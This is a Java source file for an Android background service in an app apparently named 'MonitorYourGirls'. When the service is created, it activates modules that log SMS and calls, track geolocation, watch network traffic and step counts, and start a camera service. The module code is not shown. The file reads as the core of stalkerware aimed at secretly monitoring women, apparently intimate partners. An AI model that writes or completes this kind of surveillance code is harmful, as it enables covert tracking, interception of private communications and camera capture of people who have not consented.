package com.dk.monitoryourgilrs;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;

import call.log.ActivateCallObserver;
import camera.log.ActivateCameraService;
import camera.log.CameraService;
import sms.log.ActivateSMSObserver;

public class APPService extends Service {
    private String tag = "MonitorYourGirls";
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        Log.i(tag, "MonitorYourGirlsServiceStarted");

        //Activating Other Modules

        //Activating SMS Module
        activateSMSModule();

        //Activating SMS Module
        activateCallModule();

        //Activating GeoLocation Module
        activateGeoLocationModule();

        //Activating WebData Module
        activateTrafficDataModule();

        //Activating stepCount Module
        activateStepCountModule();

        //Activating cameraService Module
        activatecameraModule();
    }

    private void activateStepCountModule() {
        sensor.step.log.StepCountService sc = new sensor.step.log.StepCountService(this);
        sc.startStepCountService();
    }

    private void activateCallModule() {
        // TODO Auto-generated method stub
        //Activating Call Modules
        call.log.ActivateCallObserver Activate = new ActivateCallObserver();
        Activate.activateCallObserver(this);
    }


    private void activateBrowserDataModule() {
        browser.log.BrowserActivator ba = new browser.log.BrowserActivator(this);
        ba.activateBrowserObserver();
    }

    private void activateSMSModule() {
        // TODO Auto-generated method stub
        //Activating SMS Modules
        sms.log.ActivateSMSObserver Activate = new ActivateSMSObserver();
        Activate.activateSMSObserver(this);
    }
    private void activateTrafficDataModule()
    {
        // TODO Auto-generated method stub
        //Activating WebData Module
        traffic.log.TrafficWatcher tw = new traffic.log.TrafficWatcher(this);
        tw.startTracingTraffic();

    }
    private void activateGeoLocationModule()
    {
        // TODO Auto-generated method stub
        // Activation GeoLocaion Module
        geo.log.GeoLocationService geo = new geo.log.GeoLocationService(this);
        geo.startLocationService();
    }

    private  void activatecameraModule(){
//        Intent face = new Intent(getApplicationContext(), CameraService.class);
//        getApplicationContext().startService(face);
        ActivateCameraService activateCameraService = ActivateCameraService.create(getApplicationContext());
        activateCameraService.start();
    }

}
